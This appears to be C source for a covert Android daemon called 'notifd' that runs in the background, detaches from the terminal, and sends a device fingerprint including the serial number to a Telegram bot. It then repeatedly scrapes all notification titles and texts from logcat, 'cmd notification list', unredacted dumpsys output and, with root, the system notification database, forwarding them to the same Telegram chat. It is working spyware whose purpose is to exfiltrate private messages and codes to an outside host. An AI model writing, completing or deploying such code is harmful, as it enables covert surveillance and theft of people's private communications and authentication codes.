#ifndef MAX_MSG
#define MAX_MSG   3800          /* Telegram hard limit 4096; headroom */
#endif

/* ---------- growable string ---------- */
typedef struct { char *p; size_t len, cap; } sb_t;

static void sb_init(sb_t *s){
    s->cap = 1024; s->len = 0;
    s->p = malloc(s->cap);
    if (!s->p){ LOGE("oom init"); exit(1); }
    s->p[0] = 0;
}
static void sb_free(sb_t *s){ free(s->p); s->p=NULL; s->len=s->cap=0; }
static void sb_grow(sb_t *s, size_t need){
    while (s->len + need + 1 > s->cap){
        s->cap *= 2;
        char *n = realloc(s->p, s->cap);
        if (!n){ LOGE("oom grow"); exit(1); }
        s->p = n;
    }
}
static void sb_putc(sb_t *s, char c){ sb_grow(s,1); s->p[s->len++]=c; s->p[s->len]=0; }
static void sb_puts(sb_t *s, const char *t){
    if (!t) return;
    size_t l = strlen(t);
    sb_grow(s,l); memcpy(s->p+s->len,t,l); s->len+=l; s->p[s->len]=0;
}
static void sb_printf(sb_t *s, const char *fmt, ...){
    va_list ap; va_start(ap,fmt);
    char tmp[2048];
    int n = vsnprintf(tmp, sizeof tmp, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if ((size_t)n >= sizeof tmp){
        char *b = malloc((size_t)n+1);
        if (!b) return;
        va_start(ap,fmt); vsnprintf(b,(size_t)n+1,fmt,ap); va_end(ap);
        sb_grow(s,(size_t)n); memcpy(s->p+s->len,b,(size_t)n); s->len+=(size_t)n; s->p[s->len]=0;
        free(b); return;
    }
    sb_grow(s,(size_t)n); memcpy(s->p+s->len,tmp,(size_t)n); s->len+=(size_t)n; s->p[s->len]=0;
}

/* ---------- curl ---------- */
typedef struct { char *p; size_t len; } mem_t;

static size_t mem_write(void *c, size_t sz, size_t nm, void *u){
    mem_t *m = u; size_t n = sz*nm;
    char *np = realloc(m->p, m->len + n + 1);
    if (!np) return 0;
    m->p = np; memcpy(m->p+m->len, c, n); m->len += n; m->p[m->len]=0;
    return n;
}

static CURL *g_curl = NULL;

static int http_post_form(const char *url, const char *body, mem_t *out){
    if (!g_curl) return -1;
    struct curl_slist *h = curl_slist_append(NULL, "Content-Type: application/x-www-form-urlencoded");
    curl_easy_setopt(g_curl, CURLOPT_URL, url);
    curl_easy_setopt(g_curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(g_curl, CURLOPT_HTTPHEADER, h);
    curl_easy_setopt(g_curl, CURLOPT_WRITEFUNCTION, mem_write);
    curl_easy_setopt(g_curl, CURLOPT_WRITEDATA, out);
    curl_easy_setopt(g_curl, CURLOPT_TIMEOUT, 25L);
    curl_easy_setopt(g_curl, CURLOPT_CONNECTTIMEOUT, 8L);
    curl_easy_setopt(g_curl, CURLOPT_NOSIGNAL, 1L);
    CURLcode rc = curl_easy_perform(g_curl);
    curl_slist_free_all(h);
    curl_easy_setopt(g_curl, CURLOPT_HTTPHEADER, NULL);
    return (int)rc;
}

static char *urlenc(const char *in){
    if (!in) return strdup("");
    sb_t o; sb_init(&o);
    for (const unsigned char *p=(const unsigned char*)in; *p; p++){
        if (isalnum(*p) || *p=='-' || *p=='_' || *p=='.' || *p=='~'){ sb_putc(&o,*p); }
        else sb_printf(&o, "%%%02X", *p);
    }
    return o.p;
}

/* Split long message into ≤ MAX_MSG chunks, send sequentially. */
static void tg_send(const char *text){
    if (!g_curl || !text || !*text) return;
    size_t total = strlen(text);
    size_t off = 0;
    while (off < total){
        size_t chunk = total - off;
        if (chunk > MAX_MSG) chunk = MAX_MSG;
        /* avoid cutting a multibyte utf8 char */
        if (off + chunk < total){
            while (chunk > 0 && ((unsigned char)text[off+chunk] & 0xC0) == 0x80) chunk--;
            if (chunk == 0) chunk = MAX_MSG;
        }
        char *frag = strndup(text+off, chunk);
        if (!frag) break;
        char *enc = urlenc(frag);
        sb_t body; sb_init(&body);
        sb_printf(&body, "chat_id=%s&text=%s&disable_web_page_preview=true", CHAT_ID, enc);
        sb_t url; sb_init(&url);
        sb_printf(&url, "https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
        mem_t r = {0};
        http_post_form(url.p, body.p, &r);
        free(r.p); sb_free(&body); sb_free(&url);
        free(enc); free(frag);
        off += chunk;
        if (off < total) usleep(200000);
    }
}

/* ---------- shell capture ---------- */
static int sh_capture(const char *cmd, sb_t *out){
    FILE *f = popen(cmd, "r");
    if (!f) return -1;
    char buf[2048];
    while (fgets(buf, sizeof buf, f)) sb_puts(out, buf);
    int rc = pclose(f);
    return WIFEXITED(rc) ? WEXITSTATUS(rc) : -1;
}

/* ---------- dedup ring ---------- */
#define RING 256
static unsigned long g_ring[RING];
static int g_ring_i = 0;

static unsigned long fnv1a(const char *s){
    unsigned long h = 1469598103934665603UL;
    while (*s){
        h ^= (unsigned char)*s++;
        h *= 1099511628211UL;
    }
    return h ? h : 1;
}
static int seen_or_mark(const char *s){
    unsigned long h = fnv1a(s);
    for (int i=0; i<RING; i++) if (g_ring[i] == h) return 1;
    g_ring[g_ring_i] = h;
    g_ring_i = (g_ring_i + 1) % RING;
    return 0;
}

/* ---------- parse helper: extract key=value from a line ---------- */
static int extract_field(const char *line, const char *key, char *out, size_t outsz){
    out[0] = 0;
    const char *p = line;
    while ((p = strstr(p, key)) != NULL){
        p += strlen(key);
        if (*p == '=' ) p++;
        else if (*p == ':' ) { p++; if (*p==' ') p++; }
        else continue;
        size_t i = 0;
        while (p[i] && p[i] != ' ' && p[i] != '\n' && p[i] != '\t' && p[i] != ',' && p[i] != '}' && i+1 < outsz){
            out[i] = p[i]; i++;
        }
        out[i] = 0;
        if (i > 0) return 0;
    }
    return -1;
}

/* =========================================================
 * SOURCE 1 : logcat -b events  (fastest, realtime)
 * ========================================================= */
static void source_logcat(sb_t *acc){
    sb_t raw; sb_init(&raw);
    /* -d = dump since last clear; -v epoch timestamps; buffer events */
    if (sh_capture("logcat -b events -d -v epoch -t 40 -s notification_enqueue 2>/dev/null", &raw) != 0){
        sb_free(&raw); return;
    }
    if (raw.len == 0){ sb_free(&raw); return; }

    char *save = NULL;
    int added = 0;
    for (char *line = strtok_r(raw.p, "\n", &save); line; line = strtok_r(NULL, "\n", &save)){
        if (!strstr(line, "notification_enqueue")) continue;
        /* format: <ts> notification_enqueue (pkg, id, user, tag, ... ) */
        char pkg[256] = {0};
        const char *lp = strchr(line, '(');
        if (lp){
            lp++;
            size_t i = 0;
            while (*lp && *lp != ',' && i+1 < sizeof pkg) pkg[i++] = *lp++;
            pkg[i] = 0;
        }
        if (!pkg[0]) continue;
        if (strncmp(pkg, "android", 7) == 0) continue;  /* skip system noise */
        char linekey[512];
        snprintf(linekey, sizeof linekey, "LC|%s|%s", pkg, line);
        if (seen_or_mark(linekey)) continue;
        sb_printf(acc, "[LC] %s : %s\n", pkg, line);
        added++;
    }
    sb_free(&raw);
    if (added == 0) { /* nothing new */ }
}

/* =========================================================
 * SOURCE 2 : cmd notification list
 * ========================================================= */
static void source_cmd_notif(sb_t *acc){
    sb_t raw; sb_init(&raw);
    if (sh_capture("cmd notification list 2>/dev/null", &raw) != 0){
        sb_free(&raw); return;
    }
    if (raw.len == 0){ sb_free(&raw); return; }

    char *save = NULL;
    char cur_pkg[256] = {0};
    char cur_title[512] = {0};
    char cur_text[1024] = {0};

    for (char *line = strtok_r(raw.p, "\n", &save); line; line = strtok_r(NULL, "\n", &save)){
        /* cmd output varies; typical fields: pkg=..., android.title=..., android.text=... */
        char tmp[1024];
        if (extract_field(line, "pkg", tmp, sizeof tmp) == 0 && tmp[0]){
            strncpy(cur_pkg, tmp, sizeof cur_pkg - 1);
            cur_pkg[sizeof cur_pkg - 1] = 0;
        }
        if (extract_field(line, "android.title", tmp, sizeof tmp) == 0 && tmp[0]){
            strncpy(cur_title, tmp, sizeof cur_title - 1);
            cur_title[sizeof cur_title - 1] = 0;
        }
        if (extract_field(line, "android.text", tmp, sizeof tmp) == 0 && tmp[0]){
            strncpy(cur_text, tmp, sizeof cur_text - 1);
            cur_text[sizeof cur_text - 1] = 0;
        }
        /* commit when we hit a separator or end of block */
        if (cur_pkg[0] && cur_title[0] && cur_text[0]){
            char key[2048];
            snprintf(key, sizeof key, "CN|%s|%s|%s", cur_pkg, cur_title, cur_text);
            if (!seen_or_mark(key)){
                sb_printf(acc, "[CN] %s\n  title: %s\n  text : %s\n",
                          cur_pkg, cur_title, cur_text);
            }
            cur_pkg[0]=cur_title[0]=cur_text[0]=0;
        }
    }
    /* flush trailing */
    if (cur_pkg[0] && (cur_title[0] || cur_text[0])){
        char key[2048];
        snprintf(key, sizeof key, "CN|%s|%s|%s", cur_pkg, cur_title, cur_text);
        if (!seen_or_mark(key)){
            sb_printf(acc, "[CN] %s\n  title: %s\n  text : %s\n",
                      cur_pkg, cur_title, cur_text);
        }
    }
    sb_free(&raw);
}

/* =========================================================
 * SOURCE 3 : notification_log.db (root only)
 * ========================================================= */
static int source_db(sb_t *acc){
    const char *db = "/data/system/notification_log.db";
    if (access(db, R_OK) != 0) return -1;
    sb_t raw; sb_init(&raw);
    const char *cmd =
        "sqlite3 " "/data/system/notification_log.db" " "
        "\"SELECT post_time||'|'||pkg||'|'||IFNULL(title,'')||'|'||IFNULL(text,'') "
        "FROM log ORDER BY post_time DESC LIMIT 25;\" 2>/dev/null";
    if (sh_capture(cmd, &raw) != 0 || raw.len == 0){
        sb_free(&raw); return -1;
    }
    char *save = NULL;
    int added = 0;
    for (char *line = strtok_r(raw.p, "\n", &save); line; line = strtok_r(NULL, "\n", &save)){
        char key[2048];
        snprintf(key, sizeof key, "DB|%s", line);
        if (seen_or_mark(key)) continue;
        /* line = post_time|pkg|title|text */
        char *p1 = strchr(line, '|');
        if (!p1) continue;
        *p1++ = 0;
        char *p2 = strchr(p1, '|');
        if (!p2) continue;
        *p2++ = 0;
        char *p3 = strchr(p2, '|');
        if (!p3) continue;
        *p3++ = 0;
        long ms = atol(line);
        time_t sec = ms / 1000;
        struct tm tm; localtime_r(&sec, &tm);
        char ts[32];
        strftime(ts, sizeof ts, "%Y-%m-%d %H:%M:%S", &tm);
        sb_printf(acc, "[DB] %s %s\n  title: %s\n  text : %s\n", ts, p1, p2, p3);
        added++;
    }
    sb_free(&raw);
    return added > 0 ? 0 : -1;
}

/* =========================================================
 * SOURCE 4 : dumpsys notification (shell)
 * ========================================================= */
static void source_dumpsys(sb_t *acc){
    sb_t raw; sb_init(&raw);
    if (sh_capture("dumpsys notification --noredact 2>/dev/null | head -n 400", &raw) != 0){
        sb_free(&raw); return;
    }
    if (raw.len == 0){ sb_free(&raw); return; }

    char *save = NULL;
    char cur_pkg[256] = {0};
    char cur_title[512] = {0};
    char cur_text[1024] = {0};

    for (char *line = strtok_r(raw.p, "\n", &save); line; line = strtok_r(NULL, "\n", &save)){
        char tmp[1024];
        if (extract_field(line, "pkg", tmp, sizeof tmp) == 0 && tmp[0]){
            strncpy(cur_pkg, tmp, sizeof cur_pkg - 1);
        }
        if (extract_field(line, "android.title", tmp, sizeof tmp) == 0 && tmp[0]){
            strncpy(cur_title, tmp, sizeof cur_title - 1);
        }
        if (extract_field(line, "android.text", tmp, sizeof tmp) == 0 && tmp[0]){
            strncpy(cur_text, tmp, sizeof cur_text - 1);
        }
        if (cur_pkg[0] && (cur_title[0] || cur_text[0])){
            char key[2048];
            snprintf(key, sizeof key, "DS|%s|%s|%s", cur_pkg, cur_title, cur_text);
            if (!seen_or_mark(key)){
                sb_printf(acc, "[DS] %s\n  title: %s\n  text : %s\n",
                          cur_pkg, cur_title, cur_text);
            }
            cur_pkg[0]=cur_title[0]=cur_text[0]=0;
        }
    }
    sb_free(&raw);
}

/* ---------- fingerprint ---------- */
static void send_fingerprint(void){
    sb_t s; sb_init(&s);
    sb_puts(&s, "== notifd online ==\n");

    char v[PROP_VALUE_MAX];
    const char *keys[] = {
        "ro.product.manufacturer",
        "ro.product.brand",
        "ro.product.model",
        "ro.product.device",
        "ro.build.version.release",
        "ro.build.version.sdk",
        "ro.build.fingerprint",
        "ro.product.cpu.abi",
        "ro.serialno",
        NULL
    };
    for (int i=0; keys[i]; i++){
        v[0] = 0; __system_property_get(keys[i], v);
        sb_printf(&s, "%s = %s\n", keys[i], v[0] ? v : "?");
    }
    sb_printf(&s, "uid   = %u\n", (unsigned)getuid());
    sb_printf(&s, "euid  = %u\n", (unsigned)geteuid());
    sb_printf(&s, "poll  = %d s\n", POLL_SEC);
    if (access("/data/system/notification_log.db", R_OK) == 0)
        sb_puts(&s, "db    = readable (root)\n");
    else
        sb_puts(&s, "db    = locked (fallback path)\n");

    tg_send(s.p);
    sb_free(&s);
}

/* ---------- daemonize ---------- */
static void daemonize(void){
    pid_t pid = fork();
    if (pid > 0) _exit(0);
    setsid();
    pid = fork();
    if (pid > 0) _exit(0);
    chdir("/");
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0){ dup2(fd,0); dup2(fd,1); dup2(fd,2); if (fd > 2) close(fd); }
}

/* ---------- main ---------- */
int main(int argc, char **argv){
    int fg = (argc > 1 && strcmp(argv[1], "--fg") == 0);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    g_curl = curl_easy_init();
    if (!g_curl){ LOGE("curl init"); return 1; }

    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP,  SIG_IGN);

    if (!fg) daemonize();

    send_fingerprint();

    int root_db = (access("/data/system/notification_log.db", R_OK) == 0);
    int cmd_ok  = 1;   /* assume ok; downgrade on repeated empty */

    while (1){
        sb_t acc; sb_init(&acc);

        /* fastest source first — logcat */
        source_logcat(&acc);

        /* rich source — cmd notification list */
        if (cmd_ok){
            sb_t probe; sb_init(&probe);
            source_cmd_notif(&probe);
            if (probe.len > 0) sb_puts(&acc, probe.p);
            sb_free(&probe);
        }

        /* root path — full archive */
        if (root_db){
            source_db(&acc);
        }

        /* shell path — dumpsys fallback */
        source_dumpsys(&acc);

        if (acc.len > 0){
            tg_send(acc.p);
        }
        sb_free(&acc);

        sleep(POLL_SEC);
    }
    return 0;
}